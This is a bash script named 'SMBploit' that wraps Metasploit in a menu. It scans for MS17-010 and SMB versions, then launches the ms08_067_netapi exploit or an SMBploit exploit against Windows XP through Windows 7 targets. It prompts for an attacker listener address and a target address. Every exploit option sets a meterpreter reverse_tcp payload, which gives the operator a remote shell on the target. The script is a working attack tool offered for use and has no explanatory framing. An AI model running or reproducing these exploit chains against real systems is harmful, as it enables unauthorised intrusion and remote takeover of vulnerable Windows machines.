#!/bin/bash

#Author: d4t4s3c
#Email:  d4t4s3c@protonmail.com
#GitHub: www.github.com/d4t4s3c

#colors
b="\033[1;37m"
r="\033[1;31m"
v="\033[1;32m"
a="\033[1;33m"
nc="\e[0m"

#var
shell="$"
n1=01
n2=02
n3=03
n4=04
n5=05
n6=06
n7=07
n8=08
n9=09
n10=10
n11=11
n12=12
n13=13
n14=14
n99=99
si=✔
no=✘

function checkroot(){
	    echo ""
	    echo -e "$a check root user $nc"
	    sleep 4
    if [ "$(id -u)" == "0" ]; then
	    echo ""
	    echo -e " $b[$v$si$b] root $nc"
	    sleep 4
	    echo ""
    else
            echo ""
	    echo -e " $b[$r$no$b] root $nc"
	    sleep 4
	    echo ""
	    echo -e "$r EXITING $nc"
	    sleep 4
	    echo ""
	    exit
    fi	
}

function banner(){
        echo -e "$b   ┌══════════════════════════════════════════┐"
        echo -e "$b   ║$v  ____  __  __ ____        _       _ _    $b║"
        echo -e "$b   ║$v / ___||  \/  | __ ) _ __ | | ___ (_) |_  $b║"
        echo -e "$b   ║$v \___ \| |\/| |  _ \| '_ \| |/ _ \| | __| $b║"
        echo -e "$b   ║$v  ___) | |  | | |_) | |_) | | (_) | | |_  $b║"
        echo -e "$b   ║$v |____/|_|  |_|____/| .__/|_|\___/|_|\__| $b║"   
        echo -e "$b   ║$v                    |_|                   $b║"
        echo -e "$b   ║$r   Author  $b:$a d4t4s3c                      $b║"
        echo -e "$b   ║$r   Email   $b:$a d4t4s3c@protonmail.com       $b║"
        echo -e "$b   ║$r   GitHub  $b:$a www.github.com/d4t4s3c       $b║"
        echo -e "$b   └══════════════════════════════════════════┘$b"
}

function main(){
        echo "" 
        echo -e "$b <==============================================>"
        echo -e "$b  [$v$n1$b]$r Scan $b   :$a Vuln MS17-010 $nc "
        echo -e "$b  [$v$n2$b]$r Scan $b   :$a SMB Version $nc "
        echo -e "$b  [$v$n3$b]$r Exploit $b:$a Windows XP$v x86 $nc "
        echo -e "$b  [$v$n4$b]$r Exploit $b:$a Windows XP$v x64 $nc "
        echo -e "$b  [$v$n5$b]$r Exploit $b:$a Windows Server 2003 SP0$v x86 $nc "
        echo -e "$b  [$v$n6$b]$r Exploit $b:$a Windows Server 2003 SP1/SP2$v x86 $nc "
        echo -e "$b  [$v$n7$b]$r Exploit $b:$a Windows Server 2003$v x64 $nc "
        echo -e "$b  [$v$n8$b]$r Exploit $b:$a Windows Vista$v x86 "
        echo -e "$b  [$v$n9$b]$r Exploit $b:$a Windows Vista$v x64 "
        echo -e "$b  [$v$n10$b]$r Exploit $b:$a Windows Server 2008$v x86"
        echo -e "$b  [$v$n11$b]$r Exploit $b:$a Windows Server 2008 R2$v x86"
        echo -e "$b  [$v$n12$b]$r Exploit $b:$a Windows Server 2008 R2$v x64"
        echo -e "$b  [$v$n13$b]$r Exploit $b:$a Windows 7$v x86"
        echo -e "$b  [$v$n14$b]$r Exploit $b:$a Windows 7$v x64"      
        echo -e "$b  [$v$n99$b]$r Exit $nc "
        echo -e "$b <==============================================>"
        echo ""
}

function menu(){

read -p " $(echo -e $v$shell $nc)" opc

    if [ $opc -eq 1 ]; then
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    clear
	    echo -e "$a Scan IP:$v $rhost $nc"
	    echo ""
	    msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010;
	    set RHOSTS $rhost;
	    run;
	    exit; "
	    echo ""
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 2 ]; then
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    clear
	    echo -e "$a Scan IP:$v $rhost $nc"
	    echo ""
	    msfconsole -q -x " use auxiliary/scanner/smb/smb_version;
	    set RHOSTS $rhost;
	    run;
	    exit; "
	    echo ""
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 3 ]; then
	    echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/ms08_067_netapi;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 4 ]; then
	    echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/ms08_067_netapi;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 5 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 1;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 6 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 2;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 7 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 3;
	    set TARGETARCHITECTURE x64;
	    exploit;
	    exit; "
            echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 8 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 4;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 9 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 5;
	    set TARGETARCHITECTURE x64;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 10 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 6;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 11 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 7;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 12 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 7;
	    set TARGETARCHITECTURE x64;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 13 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 8;
	    set TARGETARCHITECTURE x86;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 14 ]; then
            echo ""
	    echo -e "$a ¿LHOST?$nc"
	    echo ""
	    read lhost
	    echo ""
	    echo -e "$a ¿RHOST?$nc"
	    echo ""
	    read rhost
	    echo ""
	    msfconsole -q -x " use exploit/windows/smb/SMBploit;
	    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
	    set RHOSTS $rhost;
	    set LHOST $lhost;
	    set target 8;
	    set TARGETARCHITECTURE x64;
	    exploit;
	    exit; "
	    echo ""
	    sleep 5
	    clear
	    sleep 1
	    main
	    menu
    elif [ $opc -eq 99 ]; then
	    echo ""
	    echo ""
	    echo -e "$a        |\/\/\/|"
            echo -e "        |      |" 
            echo -e "        |      |" 
            echo -e "        | (o)(o) " 
            echo -e "        C      _) "
            echo -e "         | ,___|  "
            echo -e "         |   /    "
            echo -e "        /____\ "
            echo -e "       /      \ $nc"
            echo -e "$b#### $v BYE $v HACKER $b ####"
            echo ""
            echo ""
	    sleep 3
	    exit
    else
	    echo ""
	    echo -e "$a invalid option $nc"
	    echo ""
	    sleep 2
	    clear
	    sleep 1
	    main
	    menu
    fi
}

tput civis
clear
checkroot
service postgresql start
clear
banner
main
tput cnorm
menu
